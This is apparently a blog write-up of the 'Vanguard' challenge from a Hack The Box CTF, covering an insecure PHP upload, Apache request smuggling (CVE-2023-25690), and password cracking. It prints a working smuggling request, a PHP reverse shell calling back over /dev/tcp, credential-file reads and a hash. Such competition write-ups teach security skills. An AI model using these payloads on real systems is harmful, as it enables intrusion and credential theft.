In this challenge, I combined an insecure file upload with request smuggling to get a shell on the machine. The CTF ended before I could get root.

## Enumeration

I ran rustscan to check for open ports.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |                                                              
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |

Ports 22 (SSH) and 80 (HTTP) where open. I added 'vanguard.htb' to my hosts file. UDP and subdomains scans did not find anything of interest.

## Website

I looked at the website in a browser.

![Website](/assets/images/2023/07/HTBBusinessCTF/Vanguard/Vanguard.png "Website")

The site was simple. But there was a link to upload files.

![Upload Form](/assets/images/2023/07/HTBBusinessCTF/Vanguard/UploadForm.png "Upload Form")

I tried to upload files and quickly found that I could upload PHP files. But I did not know where the files were stored, and if I could access them. I found a '/uploads' endpoint, but it was password protected.

I ran Feroxbuster on the site to find hidden pages. It found that '/server-info' was accessible. 

From this page, I found some information about the Apache configuration.

```
Current Configuration:
    In file: /etc/httpd/conf/httpd.conf
     556: <VirtualHost *:80>
     563:   ProxyPassReverse "/leaders/" "http://127.0.0.1:8080/"
     568:   <Location /uploads*>
     573:     ProxyPass "http://127.0.0.1:8080/uploads/"
     574:     ProxyPassReverse "http://127.0.0.1:8080/uploads/"
        :   </Location>
        : </VirtualHost>


Current Configuration:
    In file: /etc/httpd/conf/httpd.conf
     556: <VirtualHost *:80>
     561:   RewriteEngine on
     562:   RewriteRule "^/leaders/(.*)" "http://127.0.0.1:8080/leader.php?id=$1" [P]
     565:   RewriteCond %{HTTP_HOST} !^vanguard.htb$
     566:   RewriteRule ^(.*)$ http://vanguard.htb$1 [R=permanent,L]
        : </VirtualHost>
```

With this information, and the Apache version number (2.4.55) identified by nmap, I looked for known vulnerabilities. I found it was vulnerable to [request smuggling](https://github.com/dhmosfunk/CVE-2023-25690-POC). And it was very easy to exploit.

I took the example code from the site and modified it to access the `test.php` file I had uploaded when testing the file upload.

```http
GET /leaders/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/uploads/test.php HTTP/1.1
Host: vanguard.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

The file was making a web request to my machine. And I got the hit. I uploaded a new file with a reverse shell in it.

```php
<?php
echo `bash -c 'bash -i >& /dev/tcp/10.10.14.54/4444 0>&1'`;
```

When I accessed it with the request smuggling, I got a hit on my netcat listener.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.246.192] 54416
bash: cannot set terminal process group (269): Inappropriate ioctl for device
bash: no job control in this shell
[http@vanguard uploads]$ 
```

## Getting a User

After I was connected, I looked for ways to get a user. I read `/etc/passwd` and saw that there was a maximus user on the box.

```bash
[http@vanguard vanguard]$ cat /etc/passwd
cat /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/usr/bin/nologin

systemd-timesync:x:976:976:systemd Time Synchronization:/:/usr/bin/nologin
tss:x:975:975:tss user for tpm2:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
maximus:x:1000:1000::/home/maximus:/bin/bash
```

From the Apache configuration, I knew there was an `.htpasswd` file on the server.

```bash
[http@vanguard http]$ cat  /etc/httpd/.htpasswd
cat  /etc/httpd/.htpasswd
maximus-webadmin:$apr1$4uK/teeQ$8gAFoYWl7ba5Vy7Bjy3nK/
```

I saved the hash in a file and used `hashcat` to crack it.

```bash
$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt

I used the password to reconnect to the server as maximus and read the user flag.

```bash
$ ssh maximus@target
maximus@target's password: 
[maximus@vanguard ~]$ cat user.txt 
HTB{h3y_l0ok_aT_mE_Im_a_bLu3pR1nT_sMUggL3r}
```

This is as far as I went. I spent the few minutes I had left trying to get root. But the CTF ended before I had time to root the box.
